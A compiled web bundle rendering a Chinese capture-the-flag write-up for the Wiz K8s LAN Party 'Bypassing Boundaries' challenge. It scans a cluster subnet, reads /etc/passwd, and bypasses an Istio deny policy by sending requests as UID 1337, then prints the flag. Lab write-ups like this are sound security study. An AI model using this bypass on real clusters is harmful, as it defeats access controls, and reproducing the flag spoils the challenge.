"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[42802],{17314:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Independent-Environment/K8sLanParty/4","title":"Bypassing Boundaries","description":"The Beauty and The Ist","source":"@site/docs/Independent-Environment/K8sLanParty/4.md","sourceDirName":"Independent-Environment/K8sLanParty","slug":"/Independent-Environment/K8sLanParty/4","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/K8sLanParty/4","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/K8sLanParty/4.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Data Leakage","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/K8sLanParty/3"},"next":{"title":"Lateral Movement","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/K8sLanParty/5"}}');var t=s(74848),r=s(28453);const a={},o="Bypassing Boundaries",c={},l=[];function d(n){const e={admonition:"admonition",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,r.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.header,{children:(0,t.jsx)(e.h1,{id:"bypassing-boundaries",children:"Bypassing Boundaries"})}),"\n",(0,t.jsxs)(e.admonition,{type:"note",children:[(0,t.jsx)(e.p,{children:"The Beauty and The Ist"}),(0,t.jsx)(e.p,{children:"Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don't abuse this power; use it responsibly and with caution."}),(0,t.jsx)(e.p,{children:"\u663e\u7136\uff0c\u65b0\u7684\u670d\u52a1\u7f51\u683c\u6280\u672f\u5bf9\u8d85\u9ad8\u7ea7\u7528\u6237\uff08root \u7528\u6237\uff09\u5177\u6709\u72ec\u7279\u7684\u5438\u5f15\u529b\u3002\u4e0d\u8981\u6ee5\u7528\u8fd9\u79cd\u80fd\u529b\uff1b\u8bf7\u8d1f\u8d23\u4efb\u4e14\u8c28\u614e\u5730\u4f7f\u7528\u5b83\u3002"})]}),"\n",(0,t.jsx)(e.p,{children:"\u65e2\u7136\u9898\u76ee\u8bf4\u4e86\uff0c\u5bf9\u8d85\u9ad8\u7ea7\u7528\u6237\u6709\u5438\u5f15\u529b\uff0c\u90a3\u4e48\u5148\u67e5\u770b\u7528\u6237\u72b6\u6001"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="/etc/passwd"',children:"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin\nistio:x:1337:1337::/home/istio:/bin/sh\nplayer:x:1001:1001::/home/player:/bin/sh\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4efd\u7b56\u7565"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-yaml",children:'apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: istio-get-flag\n  namespace: k8s-lan-party\nspec:\n  action: DENY\n  selector:\n    matchLabels:\n      app: "{flag-pod-name}"\n  rules:\n  - from:\n    - source:\n        namespaces: ["k8s-lan-party"]\n    to:\n    - operation:\n        methods: ["POST", "GET"]\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u53ef\u4ee5\u770b\u5230\uff0c\u88ab\u9650\u5236\u4e86\u901a\u8fc7 GET \u548c POST \u6765\u8bbf\u95ee\u670d\u52a1"}),"\n",(0,t.jsx)(e.p,{children:"\u5148\u63a2\u6d4b\u4e00\u4e0b\u670d\u52a1\u5730\u5740"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.0.0/16\n57435 / 65536 [----------------------------------------------------------------------------------------------------------------------------------------\x3e___________________] 87.64% 946 p/s\n10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.\n65398 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------------------------\x3e] 99.79% 949 p/s\n10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.\n65536 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------------------------] 100.00% 953 p/s\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@wiz-k8s-lan-party:~# curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local\nRBAC: access denied\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u9488\u5bf9 ",(0,t.jsx)(e.code,{children:"istio"})," \u8bbe\u7acb\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u4f7f\u7528 UID \u4e3a ",(0,t.jsx)(e.code,{children:"1337"})," \u7684\u7528\u6237\u6765\u7ed5\u8fc7\u9650\u5236\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"istio"})," \u8fd9\u4e2a\u7528\u6237\u6765\u53d1\u8d77\u8bf7\u6c42"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@wiz-k8s-lan-party:~# su - istio -c 'curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local'\nsu: warning: cannot change directory to /home/istio: No such file or directory\nwiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",children:"wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}\n"})})]})}function p(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>a,x:()=>o});var i=s(96540);const t={},r=i.createContext(t);function a(n){const e=i.useContext(r);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:a(n.components),i.createElement(r.Provider,{value:e},n.children)}}}]);